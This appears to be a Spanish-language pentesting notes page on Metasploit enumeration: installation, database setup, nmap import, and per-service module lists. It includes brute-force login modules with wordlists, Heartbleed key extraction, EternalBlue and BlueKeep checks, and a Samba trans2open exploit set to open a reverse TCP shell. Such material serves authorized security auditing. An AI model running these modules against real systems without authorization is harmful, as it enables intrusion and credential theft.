---
layout: article
title: Pentesting - Enumeración con Metasploit
aside:
  toc: true
sidebar:
  nav: side
header:
  theme: dark
  background: black
---

<h2><b>Configuración</b></h2>
<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Instalación de metasploit</div>
</div>

Si tienes un sistema Kali, podrás saltarte la instalación, pero si en cambio eres como yo y prefieres utilizar otros sistemas (ubuntu, debian, manjaro, popos, etc etc), te dejo un link de instalación:

[https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)

~~~bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
chmod 755 msfinstall && \
./msfinstall
~~~

También, cansada de instalar continuamente las herramientas en otro sistemas, he creado una herramienta que automatiza la instalación de las herramientas que más utilizo en las auditorías, por si prefieres instalarte todo el toolkit de hacking (obviamente incluye metasploit, la herramienta que ahora nos compete) :v:

[https://github.com/xtormin/hackarsenaltoolkit](https://github.com/xtormin/hackarsenaltoolkit)

~~~bash
git clone https://github.com/xtormin/hackarsenaltoolkit.git
cd hackarsenaltoolkit ; sudo bash hackarsenal.sh
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Instalación de la base de datos</div>
</div>

Instalación de postgresql:
~~~bash
sudo apt install postgresql
sudo systemctl start postgresql
~~~

Iniciación de la base de datos de metasploit que utilizaremos para almacenar la información de forma unificada y poder analizarla:

~~~bash
msfdb init
~~~

Para comprobar si se ha iniciado correctamente, ejecutamos:

~~~bash
msfconsole -q -x db_status
~~~

<table>
<tr>
<td class="td-black"><b>-q</b></td>
<td>No muestra el banner de metasploit</td>
</tr>
<tr>
<td class="td-black"><b>-x</b></td>
<td>Ejecución de comandos de metasploit, se pueden concatenar separándolos con ';'</td>
</tr>
</table>

<h2>Preparación del espacio de trabajo</h2>

Crear un espacio de trabajo donde insertar la información del proyecto.

~~~bash
msf> workspace -a test
msf> workspace test
~~~

Importar datos de ficheros xml de la información obtenida con nmap.

Se muestra un ejemplo de la carga de un solo fichero, y otra en la que suponemos que tenemos una carpeta con varios ficheros xml que queremos importar en la base de datos.

~~~bash
msf> db_import test.xml
msf> db_import nmap/*.xml
~~~

Si se añaden muchos datos, suele tardar un poco en cargar todo (según la cantidad de datos, quizás te da tiempo de ir a por un coffee :coffee:)

Para comprobar la información de los hosts añadidos:
~~~bash
msf> hosts
~~~

Ejemplo de búsqueda entre la información añadida:
~~~bash
msf> services -c name,info -S "ftp"
msf> services -p 80
~~~


<h2>Reconocimiento de servicios con Metasploit</h2>

El modus operandi de la automatización de pruebas con metasploit será el siguiente:
* Seleccionamos el auxiliar, exploit, ... que queramos.
* Establecemos los parámetros según la prueba a realizar (set <X>)
* Ejecutamos el filtrado de los servicios con la opción '-R' para añadir los hosts del filtro como RHOSTS.

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">FTP - 21,20</div>
</div>

[https://www.offensive-security.com/metasploit-unleashed/scanner-ftp-auxiliary-modules/](https://www.offensive-security.com/metasploit-unleashed/scanner-ftp-auxiliary-modules/)


**Auxiliares**
~~~bash
msf> use auxiliary/scanner/ftp/ftp_version
msf> use auxiliary/scanner/ftp/anonymous
msf> use auxiliary/scanner/ftp/ftp_login
msf> use auxiliary/scanner/portscan/ftpbounce
~~~

**RHOSTS**
~~~bash
msf> services -p 21 -R
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">SSH - 22</div>
</div>

[https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits](https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits)

**Auxiliares**
~~~bash
msf> use auxiliary/scanner/ssh/ssh_login
~~~

**RHOSTS**
~~~bash
msf> services -p 22 -R
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">TELNET - 23</div>
</div>

[https://www.offensive-security.com/metasploit-unleashed/scanner-telnet-auxiliary-modules/](https://www.offensive-security.com/metasploit-unleashed/scanner-telnet-auxiliary-modules/)

**Telnet login**

* Auxiliar
~~~bash
> use auxiliary/scanner/telnet/telnet_login
> set USER_FILE /opt/metasploit-framework/embedded/framework/data/wordlists/unix_users.txt
> set PASS_FILE /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt
> set BLANK_PASSWORDS true
> set THREADS 254
> set VERBOSE false
~~~

* RHOSTS
~~~bash
msf> services -p 23 -R
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">HTTP - 80</div>
</div>

TODO

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">HTTPS - 443</div>
</div>
<div id="metasploit-heartbleed"><b>HeartBleed</b></div>

* Auxiliares
~~~
> use auxiliary/scanner/ssl/openssl_heartbleed
> set action SCAN
~~~
~~~
> set action KEYS
~~~

* RHOSTS
~~~
services -p 443 -R
~~~

Ver detección de heartbleed con nmap: <a href="enumeracion#nmap-heartbleed">Heartbleed con nmap</a>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">SMB - 445</div>
</div>

[https://www.offensive-security.com/metasploit-unleashed/scanner-smb-auxiliary-modules/](https://www.offensive-security.com/metasploit-unleashed/scanner-smb-auxiliary-modules/)

**Escáners**

* Auxiliares
~~~bash
> use auxiliary/scanner/smb/pipe_auditor
> use auxiliary/scanner/smb/pipe_dcerpc_auditor
> use auxiliary/scanner/smb/smb2 # Identifica si soporta SMB2
> use auxiliary/scanner/smb/smb_enumshares
> use auxiliary/scanner/smb/smb_enumusers
> use auxiliary/scanner/smb/smb_login
> use auxiliary/scanner/smb/smb_lookupsid
> use auxiliary/scanner/smb/smb_version
> use auxiliary/scanner/rservices/rexec_login
~~~

* Comprobar si el host es vulnerable a eternalblue (MS17-010)
~~~bash
> use auxiliary/scanner/smb/smb_ms17_010
~~~

* RHOSTS
~~~bash
msf> services -p 445 -R
~~~

**Samba 2.2.X**
Las versiones de Samba 2.2.X suelen ser vulnerables a trans2open.

* Exploit
~~~bash
> use exploit/linux/samba/trans2open
> set VERBOSE true
> set PAYLOAD linux/x86/shell_reverse_tcp
> set LPORT 443
> set LHOST $(hostname -i)
~~~

* RHOSTS
~~~
services -p 445 -R
~~~

**Samba 3.4.5**
Symlink Directory Traversal
~~~
use auxiliary/admin/smb/samba_symlink/traversal
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">RDP - 3389</div>
</div>

**Bluekeep**

~~~bash
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
set RHOST 192.168.1.100
set LHOST 192.168.1.150
run
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">MongoDB - 27017,27018</div>
</div>

[https://blog.rapid7.com/2016/07/28/pentesting-in-the-real-world-going-bananas-with-mongodb/](https://blog.rapid7.com/2016/07/28/pentesting-in-the-real-world-going-bananas-with-mongodb/)

**Auxiliares**

BD de mongo sin autenticación
~~~bash
> use auxiliary/scanner/mongodb/mongodb_login
> set BLANK_PASSWORDS true
~~~


**RHOSTS**
~~~bash
msf> services -p 27017,27018 -R
~~~

<h2>Otros servicios</h2>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Entornos SAP</div>
</div>

[https://red-orbita.com/?p=9002&utm_source=rss&utm_medium=rss&utm_campaign=guia-basica-para-pentesting-de-un-entorno-sap](https://red-orbita.com/?p=9002&utm_source=rss&utm_medium=rss&utm_campaign=guia-basica-para-pentesting-de-un-entorno-sap)

<h2>Recursos adicionales</h2>

[https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#id3](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#id3)

[https://fwhibbit.es/auditando-un-servidor-smtp](https://fwhibbit.es/auditando-un-servidor-smtp)
